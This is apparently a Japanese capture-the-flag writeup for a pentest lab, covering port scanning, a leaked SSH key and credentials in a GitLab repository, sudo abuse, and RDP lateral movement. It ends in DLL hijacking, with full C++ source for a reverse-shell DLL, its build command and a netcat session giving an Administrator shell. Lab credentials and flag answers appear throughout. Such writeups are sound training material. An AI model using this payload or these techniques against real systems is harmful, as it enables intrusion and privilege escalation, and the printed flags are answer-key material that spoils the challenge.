# Writeup

サービスの偵察や列挙、クレデンシャルの探索を入念に行うことで解くことができる問題です。 \
権限昇格についてはDLLハイジャッキングのテクニックを駆使します。

## 注釈
Pentestジャンルのチャレンジ「Enumeration」について、提供していた環境に一部不備があることが判明しました。
具体的には、リバースプロキシ経由で80/tcpで公開されていたWebサイトに正常にアクセスできない不具合が発生しておりました。

なお、この不備は問題の解法や正答の判定において影響を及ぼすものではありません。
そのため、本解説動画およびWriteupの内容と当初の問題環境とで一部に差異が発生している点について、ご留意いただけますと幸いです。

## 出題テーマ
- Mission 01：なんちゃってセキュリティ対策としてのポート番号変更の無意味
- Mission 02：内部向け運用でのセキュリティ意識の甘さ、社内サーバ運用の落とし穴
- Mission 03：DLLハイジャッキングの実践

## 攻撃手順

### 1. Nmapによる列挙

攻撃対象サーバに対してNmapによるスキャンを実施します。

<!--![Nmapによるデフォルトのスキャン結果](./images/nmap_default.png)-->

```
┌──(kali㉿kali)-[~]
└─$ nmap 10.0.128.6     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-12 17:12 JST
Nmap scan report for ip-10-0-128-6.ap-northeast-1.compute.internal (10.0.128.6)
Host is up (0.0017s latency).
Not shown: 996 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
                   
```

この際、デフォルトのポートスキャンでは、攻撃の導線となる8480番ポートが公開されていることを発見できません。 \
[公式リファレンス](https://nmap.org/man/ja/man-port-specification.html)によると、以下の記載があり、すべてのポートが調査されていないことがわかります。

> デフォルトでは、Nmapは、1024番(を含む)までの全ポートと、1025番以降のポートはスキャン対象のプロトコルに応じてnmap-servicesファイルに記載されたポートをスキャンする。

次のコマンド例で示すように`-p`オプションを活用することで、すべてのポートに対してスキャンをかけることができます。

```
nmap <ターゲットのIP> -p- -sV
```

<!--![Nmapによるすべてのポートを対象としたスキャン結果](./images/nmap_full.png)-->

```
┌──(kali㉿kali)-[~]
└─$ nmap 10.0.128.6 -p- -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-12 17:16 JST
Nmap scan report for www.mirai-itsystems.local (10.0.128.6)
Host is up (0.0017s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp       Postfix smtpd
53/tcp   open  tcpwrapped
80/tcp   open  http       nginx
8060/tcp open  http       nginx 1.29.0
8480/tcp open  http       nginx
Service Info: Host:  ip-172-31-11-83.ap-northeast-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.51 seconds
                                       
```

80番ポートにブラウザからアクセスすると`www.mirai-itsystems.local`へリダイレクトされていることがわかります。

![80番ポートアクセス時の挙動](./images/redirect.png)

このことからIPアドレスとドメインの紐づけが必要であるとわかるため`/etc/hosts`に次のエントリを追記します。

```
<ターゲットのIP> www.mirai-itsystems.local
```

対応付けをすることでWebページを確認できました。

![ターゲットが運営しているWebサイトページ](./images/miraiit.png)

### 2. GitLabサーバのWebアプリケーション探索

8480番ポートにアクセスすると、GitLabのログイン画面が表示されていることがわかります。

![GitLabのログイン画面](./images/gitlab_login.png)

アカウントを作成することで、管理者の認証を通すことなくログインすることができます。

![ダッシュボードのページ](./images/dashboard.png)

ここでダッシュボードのページから「Explore public projects」を選択すると、全体公開に設定されているリポジトリを表示することができます。今回はWebページの管理用リポジトリを発見することができます。

![公開リポジトリを発見](./images/publicrepo.png)

WebGUI以外ではGitLabのAPIを使用する方法があります。
アクセストークンを発行し、次のようなコマンドを実行します。

```
curl --header "PRIVATE-TOKEN:<Access Token>" "http://www.mirai-itsystems.local:8480/api/v4/projects" | jq
```

![GitLab APIで「api」を選択](./images/api_setting.png)

```
┌──(kali㉿kali)-[~]
└─$ curl --header "PRIVATE-TOKEN:glpat-YFjHDr9R4hUdqvRQmsWOQW86MQp1OjYH.01.0w10oheb3" "http://www.mirai-itsystems.local:8480/api/v4/projects" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4099  100  4099    0     0  11342      0 --:--:-- --:--:-- --:--:-- 11354
[
  {
    "id": 1,
    "description": null,
    "name": "www.mirai-itsystems.local",
    "name_with_namespace": "Mirai IT Systems / www.mirai-itsystems.local",
    "path": "www.mirai-itsystems.local",
    "path_with_namespace": "mirai-it-systems/www.mirai-itsystems.local",
    "created_at": "2025-08-29T16:36:28.991+09:00",
    "default_branch": "master",
    "tag_list": [],
    "topics": [],
    "ssh_url_to_repo": "ssh://git@mirai-itsystems.local:22422/mirai-it-systems/www.mirai-itsystems.local.git",
    "http_url_to_repo": "http://mirai-itsystems.local:8480/mirai-it-systems/www.mirai-itsystems.local.git",
    "web_url": "http://mirai-itsystems.local:8480/mirai-it-systems/www.mirai-itsystems.local",
    "readme_url": "http://mirai-itsystems.local:8480/mirai-it-systems/www.mirai-itsystems.local/-/blob/master/README.md",
    "forks_count": 0,
    "avatar_url": null,
    "star_count": 0,
    "last_activity_at": "2025-08-29T16:36:28.911+09:00",
    "visibility": "public",
    "namespace": {

...

```

<!-- ![GitLab APIを用いた公開リポジトリの探索](./images/gitlab_api.png) -->

### 3. 公開リポジトリの探索

`www.mirai-itsystems.local`のリポジトリを探索します。 \
README.mdには、社員のアカウント情報が記載されています。

![社員のアカウント情報の手がかり](./images/members.png)

また、コミットログを確認すると、SSH接続用の秘密鍵を削除した履歴を確認できます。

![誤ってコミットされた認証情報](./images/cred.png)

### 4. GitLabサーバへの侵入(user.txt取得)

記載されていたアカウントのユーザ名情報と秘密鍵を組み合わせてSSHサーバへの侵入を試みます。 \
ここで、秘密鍵ファイルが所有者以外からも読み込める状態だと`ssh`コマンド実行時にエラーとなるため、`chmod`コマンドで所有者のみが読み込めるように変更する必要があります。

複数の組み合わせを試すと`m.yamada`ユーザでログインに成功します。

```
┌──(kali㉿kali)-[~]
└─$ chmod 400 id_ed25519

┌──(kali㉿kali)-[~]
└─$ ssh m.yamada@10.0.128.6 -i id_ed25519
The authenticity of host '10.0.128.6 (10.0.128.6)' can't be established.
ED25519 key fingerprint is SHA256:GTRDyXCBRAcO73CnOM0s/X9xrHwZAVgZYmYNTQeukPw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.128.6' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.14.0-1011-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Sep 12 08:49:40 UTC 2025

  System load:  0.17               Temperature:           -273.1 C
  Usage of /:   28.3% of 28.02GB   Processes:             183
  Memory usage: 79%                Users logged in:       1
  Swap usage:   40%                IPv4 address for ens5: 10.0.128.6


Expanded Security Maintenance for Applications is not enabled.

11 updates can be applied immediately.
11 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Sep 12 08:48:03 2025 from 192.168.100.10
m.yamada@ip-10-0-128-6:~$
```

`m.yamada`ユーザのホームディレクトリを確認するとフラグが存在することが分かります。

<!--![`m.yamada`ユーザでのログイン](./images/myamada.png)-->

```
m.yamada@ip-10-0-128-6:~$ ls
user.txt
m.yamada@ip-10-0-128-6:~$ cat user.txt
flag{Z9cfPPYpGx6wnJQZxurDiThmUtrgmCpv}
```

<!--![1つ目のuser.txt取得](./images/user1.png)-->

<!--`flag{Z9cfPPYpGx6wnJQZxurDiThmUtrgmCpv}`-->

### 5. GitLabサーバのOS探索

侵入したGitLabサーバの内部を探索します。

`ps axf`コマンド等で、サーバで実行されているプロセスを確認すると、GitLabのほかにもnginxが別に稼働していることを確認できます。

![nginxのプロセス](./images/nginx.png)

nginxの設定ファイルの一つである`/etc/nginx/sites-available/default`を確認すると、80番ポートで稼働しているWebページへのリクエストが、`http://www.mirai-itsystems.local/`へ転送されることに気づきます。

```
m.yamada@ip-10-0-128-6:~$ cat /etc/nginx/sites-available/default
##
# You should look at the following URL's in order to grasp a solid understanding
# of Nginx configuration files in order to fully unleash the power of Nginx.
# https://www.nginx.com/resources/wiki/start/
# https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
# https://wiki.debian.org/Nginx/DirectoryStructure
#
# In most cases, administrators will remove this file from sites-enabled/ and
# leave it as reference inside of sites-available where it will continue to be
# updated by the nginx packaging team.
#
# This file will automatically load configuration files provided by other
# applications, such as Drupal or Wordpress. These applications will be made
# available underneath a path with that package name, such as /drupal8.
#
# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
##

# Default server configuration
#
server {
        listen 80 default_server;
        server_name mirai-itsystems.local;
        server_tokens off;

        return 301 http://www.mirai-itsystems.local$request_uri;
}

server {
        listen 80;
        server_name www.mirai-itsystems.local;

        location / {
                proxy_pass http://www.mirai-itsystems.local;
                proxy_set_header Host $host;
                proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header X-Forwarded-Proto $scheme;
        }
}

```

<!--![`/etc/nginx/sites-available/default`の内容](./images/nginx_conf.png)-->

自サーバあてに名前解決のリクエストを送信してみるとWebサーバが動作しているIPアドレスを確認できます。

```
m.yamada@ip-10-0-128-6:~$ dig @localhost www.mirai-itsystems.local

; <<>> DiG 9.18.30-0ubuntu0.24.04.2-Ubuntu <<>> @localhost www.mirai-itsystems.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 23513
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
;; QUESTION SECTION:
;www.mirai-itsystems.local.     IN      A

;; ANSWER SECTION:
www.mirai-itsystems.local. 0    IN      A       10.0.128.11

;; Query time: 0 msec
;; SERVER: 127.0.0.1#53(localhost) (UDP)
;; WHEN: Fri Sep 12 09:19:04 UTC 2025
;; MSG SIZE  rcvd: 70

```

<!--![Webサーバが稼働しているIPアドレスの確認](./images/web_ip.png)-->

この方法でなくても、DNSサーバの設定ファイルを確認することでIPアドレスを直接確認できます。
IPアドレスは、マシンの起動やリセットごとにが変更されてしまうことに注意してください。

```
m.yamada@ip-10-0-128-6:~$ cat /etc/hosts-dnsmasq
10.0.128.11     www.mirai-itsystems.local
10.0.128.6    mirai-itsystems.local
```

<!--![dnsmasqの設定ファイル](./images/dnsmasq.png)-->

### 6. GitLabサーバ上での設定変更

発見したWebサーバ `www.mirai-itsystems.local` への侵入経路を考えます。

GitLabサーバでアカウントを作成した際、そのアカウントの権限は管理者ではありませんでした。
先ほど作成したGitLabアカウントを管理者のユーザとして動かすことで、閲覧できる範囲が広がるかもしれません。

`sudo -l`コマンドを実行すると、侵入に用いた`m.yamada`ユーザがsudo権限も保有しているとわかります。

```
m.yamada@ip-10-0-128-6:~$ sudo -l
sudo: unable to resolve host ip-10-0-128-6: Name or service not known
Matching Defaults entries for m.yamada on ip-10-0-128-6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User m.yamada may run the following commands on ip-10-0-128-6:
    (root) NOPASSWD: ALL
```

次のようなコマンドを実行することで、GitLabでのユーザ権限を変更することができます。 \
数分ほどで実行が完了し、GitLabの管理者権限を得られます。

```
sudo gitlab-rails runner "user = User.find_by_username('<作成したユーザ名>'); user.admin = true; user.save!"
```

```
m.yamada@ip-10-0-128-6:~$ sudo gitlab-rails runner "user = User.find_by_username('tester'); user.admin = true; user.save!"
sudo: unable to resolve host ip-10-0-128-6: Name or service not known
```

<!-- ![GitLabでのユーザ権限変更](./images/change_admin.png) -->

### 7. 管理者としてのGitLabサーバのWebアプリケーション探索

GitLabの管理者アカウントとしてMirai IT Systemsグループを確認すると、内部向けのリポジトリを発見できます。

![内部向けリポジトリを発見](./images/privaterepo.png)

Internalのリポジトリでは会社のサーバ構成を確認できます。

![会社のサーバ構成図](./images/infra.png)

また、Issuesのリストを確認すると多数のIssueが起票されていることを確認できます。

![内部向けリポジトリのIssues](./images/issues.png)

Issues内を検索することでRDPとしての認証情報を発見できます。

![RDPの認証情報が記載されたIssue](./images/rdp_issue.png)

### 8. Webサーバへの横展開(user.txt取得)

上で見つけたWebサーバへ、発見した認証情報でRDP接続を試すとログインに成功します。

次のようなコマンドを実行します。
この際、Browser Kaliを使っている場合はプロキシ設定と競合するため`no_proxy`環境変数を置き換えつつ実行する必要があります。

```
no_proxy=<www.mirai-itsystems.localのIP> xfreerdp /u:develop_common /p:7qx89Vz58TQLJYrUaaLG8CcaxJLXD6DT /v:<www.mirai-itsystems.localのIP>
```

デスクトップを確認するとフラグが存在することが分かります。

![no_proxyを設定したうえでRDP接続を実施](./images/user2.png)

`flag{3ibPzKAiNpJYtL6chLGtpyrkPwn6tDrd}`

### 9. WebサーバのOS探索

侵入したWebサーバはWindowsが稼働しています。

タスクスケジューラを確認すると、Webサーバの監視用タスクが`Administrator`ユーザとして実行されていることを確認できます。

![タスクスケジューラに登録されているタスク](./images/schtasks.png)

そして、実行先の実行可能ファイルとして`C:\Monitor\MonitorIISTask.exe`が指定されているとわかります。

![MonitorIISTask.exeのロケーション](./images/task.png)

### 10. DLLハイジャッキングによる権限昇格(root.txt取得)

`MonitorIISTask.exe`が何のファイルであるかを確認します。

同じディレクトリ配下にある`MonitorIISTask.runtimeconfig.json`は.NETアプリケーションのビルド時に生成されるファイルであることから、このファイルが.NETフレームワークで作成されていることを推測できます。

[dnSpy](https://github.com/dnSpyEx/dnSpy)は.NETフレームワークの実行可能ファイルを解析するためのツールです。 \
dnSpyのZIPファイルを転送・展開し、解析にかけてみます。

なお、実際のペネトレーションテスト業務においては、実際のターゲット環境ではなく、検証環境にて解析を行うことが多いです。
今回は分かりやすさのため、ターゲット環境で解析を行う方法を用いています。

![dnSpyのZIPファイルを転送](./images/dnspy_zip.png)

MonitorIISTask.exeが呼び出している`MonitorIISTask.dll`を解析すると、内部で`NotifierWrapper`クラスの`Send()`メソッドで、`notifier.dll`の`Send`関数を呼び出すことを確認できます。

![notifier.dllの呼び出し](./images/dnspy_notifier.png)

またこの際、Main関数において呼び出し先のDLLファイルとして指定するパスが`notifier.dll`とファイル名のみの指定であり、フルパス指定ではないことも併せて確認することができます。 \
したがって、この脆弱性を悪用することによるDLLハイジャッキングの可能性を推測できます。

なお.NETアプリケーションの解析においてはKali Linuxでも[AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy)というツールを使うことで確認可能です。

![Main関数のデコンパイル結果](./images/dnspy_main.png)

例として、以下のようなリバースシェルを張るコードを`notifier.dll`をビルドします。

- notifier.h

```cpp
#pragma once

#include <string>

# ifdef VC_DLL_EXPORTS
# undef VC_DLL_EXPORTS
# define VC_DLL_EXPORTS extern "C" __declspec(dllexport)
# else
# define VC_DLL_EXPORTS extern "C" __declspec(dllimport)
# endif

VC_DLL_EXPORTS void __cdecl Send(const char* message);
```

- notifier.cpp

```cpp
#include "notifier.h"
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
char ip_addr[16] = "<KaliのIP>"; 
char port[6] = "4444";            

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

void _cdecl Send(const char* message)
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);


    struct hostent *host; 
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
}
```

ビルドはLinux上でも以下のようなコマンドで行えます。

```
x86_64-w64-mingw32-gcc -shared -o notifier.dll notifier.cpp -l ws2_32
```

ビルドした`notifier.dll`を`MonitorIISTask.exe`と同じディレクトリ配下に設置することで、タスクスケジューラーによって次に`MonitorIISTask.exe`が`Administrator`ユーザとして実行されるときに、配置した`notifier.dll`の`Send`関数が実行されます。

kali上でリバースシェルを待ち受け、しばらく待つと`Administrator`ユーザとしてリバースシェルを張ることができます。

`C:\Users\Administrator`配下で`root.txt`を探すと`C:\Users\Administrator\Desktop`に存在することが分かります。

```
┌──(kali㉿kali)-[~]
└─$ nc -lvp 4444
listening on [any] 4444 ...
10.0.128.11: inverse host lookup failed: Unknown host
connect to [192.168.100.10] from (UNKNOWN) [10.0.128.11] 59221
Microsoft Windows [Version 10.0.20348.3807]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
ec2amaz-kjo15rd\administrator

C:\Windows\system32>cd C:\Users\Administrator
cd C:\Users\Administrator

C:\Users\Administrator>dir /s root.txt
dir /s root.txt
 Volume in drive C has no label.
 Volume Serial Number is 1CE9-5F0A

 Directory of C:\Users\Administrator\Desktop

08/29/2025  05:36 AM                40 root.txt
               1 File(s)             40 bytes

     Total Files Listed:
               1 File(s)             40 bytes
               0 Dir(s)  12,866,961,408 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1CE9-5F0A

 Directory of C:\Users\Administrator\Desktop

07/17/2025  12:35 PM    <DIR>          .
07/16/2025  12:45 AM    <DIR>          ..
07/16/2025  12:53 AM        28,572,832 dotnet-runtime-8.0.18-win-x64.exe
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
08/29/2025  06:56 AM             2,308 Microsoft Edge.lnk
08/29/2025  05:36 AM                40 root.txt
               5 File(s)     28,576,261 bytes
               2 Dir(s)  12,867,588,096 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
flag{JnTzhA3mFctY7aRKSGJKqT2MJFLXprNJ}

```

<!--![root.txtの取得](./images/root.png)-->

<!--`flag{JnTzhA3mFctY7aRKSGJKqT2MJFLXprNJ}`-->
